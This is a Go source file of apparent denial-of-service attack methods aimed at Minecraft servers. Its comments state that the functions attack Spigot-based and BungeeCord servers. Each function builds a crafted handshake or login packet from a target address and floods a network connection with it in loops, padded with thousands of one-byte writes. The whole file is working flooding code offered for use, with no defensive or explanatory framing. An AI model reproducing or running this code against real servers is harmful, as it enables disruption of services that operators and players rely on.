package methods

import (
	"fmt"
	"math/rand"
	"net"
	"reflect"
	"strconv"
	"time"
)

// makeBytes puts given data into []byte slice
func makeBytes(data ...interface{}) []byte {
	var bytes []byte

	for _, arg := range data {
		var argType = reflect.TypeOf(arg).String()

		switch argType {
		case "int":
			var integer = arg.(int)
			var intLowerBits = integer & 0xFF

			bytes = append(bytes, byte(intLowerBits))
		case "string":
			var str = arg.(string)

			bytes = append(bytes, []byte(str)...)
		default:
			fmt.Println("Unknown type!", argType)
		}
	}

	return bytes
}

// Data is used as an argument for functions below
type Data struct {
	Address string
	Loop    int
	bytes   []byte
	one     []byte
	zero    []byte
}

//Extreme1 is for spigot based servers
func Extreme1(data *Data, out net.Conn) bool {
	if data.bytes == nil {
		data.bytes = makeBytes(15, 0, 99, 453, data.Address, 457, 1)
		data.one = makeBytes(1)
		data.zero = makeBytes(0)
	}

	fmt.Println("sent")

	for i := 0; i < data.Loop; i++ {
		_, err := out.Write(data.bytes)

		if err != nil {
			return true
		}

		for n := 0; n < 1900; n++ {
			out.Write(data.one)
			out.Write(data.zero)
		}
	}

	return false
}

// Flooder3 is used to attack BungeeCord
func Flooder3(data *Data, out net.Conn) bool {
	if data.bytes == nil {
		data.bytes = makeBytes(0, 47, 20, 109, data.Address, 99, 45, 50, 50, 55, 55, 46, 114, 97, 122, 105, 120, 112, 118, 112, 46, 100, 101, 46, 99, -35, 2)
		data.one = makeBytes(1)
		data.zero = makeBytes(0)
	}

	//fmt.Println("sent")

	for i := 0; i < data.Loop; i++ {
		_, err := out.Write(data.bytes)

		if err != nil {
			return true
		}

		for n := 0; n < 1900; n++ {
			out.Write(data.one)
			out.Write(data.zero)
		}
	}

	return false
}

// Auth smashes bungee
func Auth(data *Data, out net.Conn) bool {
	if data.bytes == nil {
		data.bytes = makeBytes(15, 0, 47, 15, data.Address, 99, 223, 2)
	}

	fmt.Println("sent")

	out.Write(data.bytes)
	rand.NewSource(time.Now().UnixNano())

	_, err := out.Write(makeBytes(strconv.Itoa(rand.Intn(400))))

	if err != nil {
		return true
	}

	return false
}

// Spigot1 is for spigot o_O
func Spigot1(data *Data, out net.Conn) {
	if data.bytes == nil {
		data.bytes = makeBytes(15, 0, 47, 9, data.Address, 99, 224, 1)
		data.one = makeBytes(1)
		data.zero = makeBytes(0)
	}

	fmt.Println("sent")

	for i := 0; i < data.Loop; i++ {
		out.Write(data.bytes)

		for n := 0; n < 1000; n++ {
			out.Write(data.one)
			out.Write(data.zero)
		}
	}
}
